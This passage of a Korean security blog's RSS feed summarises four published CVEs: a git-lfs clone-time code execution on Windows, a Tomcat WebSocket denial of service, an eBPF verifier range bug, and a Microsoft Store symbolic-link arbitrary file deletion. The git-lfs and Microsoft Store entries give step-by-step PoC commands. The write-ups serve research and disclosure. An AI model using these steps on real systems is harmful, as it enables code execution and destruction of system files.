lfs 파일을 추가합니다.</p><pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> git add .gitattributes<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.datgit add lfs.dat</code></pre></li><li><p>바이너리와 lfs 파일을 커밋하고 원격 저장소에 업로드합니다.</p><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>git remote add origin https://repository_urlgit push -u origin master</code></pre></li><li><p>Windows 시스템에서 clone할 때 git-lfs 취약점이 트리거되어 기존 git 바이너리 대신 공격자의 원격 저장소에서 clone한 악성 <code>git.bat</code>이 사용자 상호작용 없이 실행됩니다.</p><pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_urlgit-lfs RCE exploit!!</code></pre></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/git/">git</category>
      
      <category domain="https://hackyboiz.github.io/tags/git-lfs/">git lfs</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-13935: Apache Tomcat Websocket 취약점</title>
      <link>https://hackyboiz.github.io/2020/11/05/idioth/2020-11-05/</link>
      <guid>https://hackyboiz.github.io/2020/11/05/idioth/2020-11-05/</guid>
      <pubDate>Thu, 05 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.redteam-pentesting.de/2020/websocket-vulnera</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat<ul><li>10.0.0-M1 ~ 10.0.0-M6</li><li>9.0.0.M1 ~ 9.0.36</li><li>8.5.0 ~ 8.5.56</li><li>7.0.27 ~ 7.0.104</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 Apache Tomcat의 WebSocket 프레임에서 <code>payloadLength</code>에 의해 무한 루프가 트리거 되어 DoS 공격으로 연결될 수 있는 취약점입니다.</p><p><a href="https://tools.ietf.org/html/rfc6455#section-5.2">RFC6455</a>의 WebSocket 프레임에서 payload length 필드가 127(2진수 1111111)이면 64비트 확장 payload length를 사용합니다. 이 payload length는 64비트 unsigned integer이지만 RFC에서는 최상위 비트가 항상 0이 되도록 요구합니다.</p><p>따라서 payload length 필드를 127로 설정해준 후 다음 8바이트의 MSB를 1로 설정해주기만 하면 DoS 공격을 수행할 수 있습니다.</p><p>취약점과 관련된 패치는 <code>payloadLength</code>가 음수가 될 경우 exception을 발생시키도록 패치되었습니다.</p><pre><code class="hljs java"><span class="hljs-comment">// The most significant bit of those 8 bytes is required to be zero</span><span class="hljs-comment">// (see RFC 6455, section 5.2). If the most significant bit is set,</span><span class="hljs-comment">// the resulting payload length will be negative so test for that.</span><span class="hljs-keyword">if</span> (payloadLength &lt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> WsIOException(        <span class="hljs-keyword">new</span> CloseReason(            CloseCodes.PROTOCOL_ERROR,            sm.getString(<span class="hljs-string">&quot;wsFrame.payloadMsbInvalid&quot;</span>)        )    );&#125;</code></pre><p>해당 취약점에 관한 PoC Code는 <a href="https://github.com/RedTeamPentesting/CVE-2020-13935">여기</a>서 확인할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/apache/">apache</category>
      
      <category domain="https://hackyboiz.github.io/tags/tomcat/">tomcat</category>
      
      <category domain="https://hackyboiz.github.io/tags/websocket/">websocket</category>
      
      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/05/idioth/2020-11-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-27194: eBPF verifier bug</title>
      <link>https://hackyboiz.github.io/2020/11/04/fabu1ous/2020-11-04/</link>
      <guid>https://hackyboiz.github.io/2020/11/04/fabu1ous/2020-11-04/</guid>
      <pubDate>Wed, 04 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linu</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">Fuzzing for eBPF JIT bugs in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Linux kernel</p><p>eBPF</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 트래킹해  memory load와 store의 out-of-bound 여부를 검사하며,  32-bit와 64-bit 각각의 range를 구분해 관리합니다. OR연산이 끝난 후 그에 맞게  32-bit 레지스터의 range를 업데이트하는 <code>scalar32_min_max_or()</code>함수는 이 구분이 확실하지 못하고, 버그를 유발합니다.</p><pre><code class="hljs c"><span class="hljs-comment">/* ORing two positives gives a positive, so safe to</span><span class="hljs-comment">* cast result into s64.</span><span class="hljs-comment">*/</span>dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</code></pre><p>64-bit range를 32-bit range로 casting 하는 <code>scalar32_min_max_or()</code>의 코드 부분입니다. Verifier는 <code>s32_min_value</code>와 <code>s32_max_value</code>를 이용해 range를 트래킹 하는데, 만약 이 두 값이 같다면 레지스터 값을 상수로 인식하고 그에 따라 코드가 분기합니다. </p><p>만약 위 코드에서 <code>dst_reg-&gt;umin_value</code>가 1이고, <code>dst_reg-&gt;umax_value</code>가 25769803777이라면 <code>dst_reg-&gt;s32_min_value</code>와 <code>dst_reg-&gt;s32_max_value</code> 둘 다 1로 저장되어 레지스터를 range가 아닌 상수로 인식하게 됩니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf">https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/ebpf/">ebpf</category>
      
      <category domain="https://hackyboiz.github.io/tags/bpf/">bpf</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/04/fabu1ous/2020-11-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-16877: Exploiting Microsoft Store Games</title>
      <link>https://hackyboiz.github.io/2020/11/03/l0ch/11-03_1day1line/</link>
      <guid>https://hackyboiz.github.io/2020/11/03/l0ch/11-03_1day1line/</guid>
      <pubDate>Tue, 03 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.ioactive.com/2020/11/cve-2020-16877-exploiti</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html">CVE-2020-16877: Exploiting Microsoft Store Games</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 - Microsoft Store</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Store에서 배포하는 UWP(Universal Windows platform) 앱은 일반적으로  <code>C:\Program Files\WindowsApps</code> 디렉터리에 저장되어 일반적인 권한으로 접근할 수 없으며 Appx라는 형식의 파일을 앱 설치 관리자 프로그램을 통해서만 설치/제거가 가능합니다. </p><p>지난 6월 Microsoft는 게임 앱의 모드를 지원하기 위해 수정이 가능한 Windows 앱을 호스팅 하는 디렉터리인 <code>C:\ProgramFiles\ModifiableWindowsApps</code>을 추가했는데, 이 기능에 심볼릭 링크를 사용해 arbitrary file deletion 취약점이 발견되었습니다.</p><p>PoC는 아래와 같습니다.</p><ol><li>다른 시스템 드라이브 <code>D:\</code>에 pivot 할 경로를 생성하고 windows 저장소 설정을 통해 기본 저장 위치를 <code>D:\</code> 로 변경합니다</li></ol><pre><code class="hljs powershell"><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\Program Files&quot;</span><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\pivot&quot;</span></code></pre><ol start="2"><li><p>Microsoft Store에서 모드 지원이 되는 게임 앱을 받아 설치하면 <code>D:\Program Files\ModifiableWindowsApps</code> 하위에 해당 앱의 디렉터리가 생성됩니다.</p></li><li><p>이중 심볼릭 링크를 생성해 앱의 디렉터리가 심볼릭 링크의 교차점이 되도록 만들고, 심볼릭 링크로 리디렉션 할 최종 디렉터리는 삭제할 시스템 권한의 디렉터리로 설정합니다.</p></li></ol><pre><code class="hljs powershell">mklink / J <span class="hljs-string">&quot;D:\Program Files\ModifiableWindowsApps&quot;</span> <span class="hljs-string">&quot;D:\pivot&quot;</span>mklink / J <span class="hljs-string">&quot;D:\pivot\Game_App&quot;</span> <span class="hljs-string">&quot;C:\arbitrary_path\to_delete&quot;</span></code></pre><ol start="4"><li>앱을 삭제하면 이중 심볼릭 링크로 인해 시스템 권한으로 임의 경로의 파일이 삭제됩니다.</li></ol><p>작성자는 시스템 권한의 쉘을 실행하는 데모 영상 또한 공개했습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-deletion/">arbitrary file deletion</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft-store/">microsoft store</category>
      
      <category domain="https://hackyboiz.github.io/tags/symbolic-link/">symbolic link</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/03/l0ch/11-03_1day1line/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
